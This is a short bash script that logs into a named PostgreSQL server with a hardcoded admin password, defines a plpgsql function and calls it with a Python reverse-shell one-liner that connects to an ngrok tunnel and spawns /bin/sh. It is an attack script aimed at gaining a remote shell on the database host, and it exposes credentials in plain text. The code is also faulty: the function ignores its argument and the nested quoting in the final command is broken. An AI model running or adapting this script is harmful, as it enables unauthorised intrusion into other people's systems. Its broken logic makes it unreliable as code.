#!/bin/bash

DB_NAME="postgres"  
USER="admin"
HOST="postgresql-marketing-htz-fsn1-1.wvservices.com"
PASSWORD="FOje92h9hefsjenjfgrs"

export PGPASSWORD=$PASSWORD
psql -U $USER -h $HOST -d $DB_NAME -c "
CREATE OR REPLACE FUNCTION run_command(command text) RETURNS void AS \$\$
DECLARE
    result text;
BEGIN
    EXECUTE 'COPY (SELECT * FROM pg_catalog.pg_tables) TO ''/tmp/tables.txt'' WITH CSV'; 
END;
\$\$ LANGUAGE plpgsql;"

psql -U $USER -h $HOST -d $DB_NAME -c "SELECT run_command("nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.tcp.eu.ngrok.io",12811));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])' &");"
